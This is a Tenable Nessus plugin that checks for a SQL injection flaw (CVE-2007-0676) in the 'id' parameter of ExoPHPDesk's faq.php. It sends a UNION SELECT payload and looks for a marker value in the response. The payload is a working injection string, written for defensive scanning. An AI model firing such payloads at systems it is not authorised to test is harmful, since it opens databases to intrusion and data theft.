#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24267);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2007-0676");
  script_bugtraq_id(22338);
  script_xref(name:"OSVDB", value:"36027");

  script_name(english:"ExoPHPDesk faq.php id Variable SQL Injection");
  script_summary(english:"Tries to generate a SQL error with Exo PHPDesk");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Exo PHPDesk, a helpdesk application written
in PHP. 

The version of Exo PHPDesk on the remote host fails to properly
sanitize input to the 'id' parameter of the 'faq.php' script before
using it in database queries.  Provided PHP's 'magic_quotes_gpc'
setting is disabled, an unauthenticated remote attacker can leverage
this issue to launch SQL injection attacks against the affected
application, leading to discovery of sensitive information, attacks
against the underlying database, and the like." );
 script_set_attribute(attribute:"see_also", value:"http://www.milw0rm.com/exploits/3234" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/exophpdesk", "/exodesk", "/helpdesk", "/support", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw.
  magic = rand();
  exploit = string("-1' UNION SELECT 0,", magic, ",0,0,0,0,0--");

  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/faq.php?",
      "action=&",
      "type=view&",
      "s=&",
      "id=", urlencode(str:exploit)
    ), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like LifeType and...
    ">Powered by ExoPHPDesk" >< res &&
    # it uses our magic for the FAQ title.
    string(">F.A.Q. Title: ", magic, "</") >< res
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
